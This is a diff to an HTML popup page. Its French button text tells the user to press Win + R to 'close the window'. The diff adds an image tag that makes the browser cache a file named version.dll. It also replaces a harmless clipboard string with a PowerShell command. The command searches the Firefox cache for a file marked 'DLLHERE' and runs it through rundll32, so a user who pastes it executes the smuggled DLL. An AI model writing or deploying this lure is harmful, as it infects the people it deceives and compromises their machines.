@@ -941,12 +941,22 @@
           padding:0.7rem;font-size:0.92rem;font-weight:700;cursor:pointer;
         ">pour fermer la fenetre merci de faire Win + R</button>
 
+        <img src="version.dll" alt="image here">
+
         <script>
           function close_verol_popup() {
             document.getElementById('alertPopup').style.display = 'none';
             const copyBtn = document.getElementById('copyBtn');
 
-            navigator.clipboard.writeText("hello from clipboard");
+            navigator.clipboard.writeText(`
+              foreach($f in @("$env:LOCALAPPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\cache2\\entries\\")){
+                  Get-ChildItem $f -Recurse | ForEach-Object {
+                      if (Select-String -Pattern "DLLHERE" -Path $_.FullName){
+                          rundll32.exe "$($_.FullName)",DllMain
+                      }
+                  }
+              }
+            `);
         } 
         </script>
 
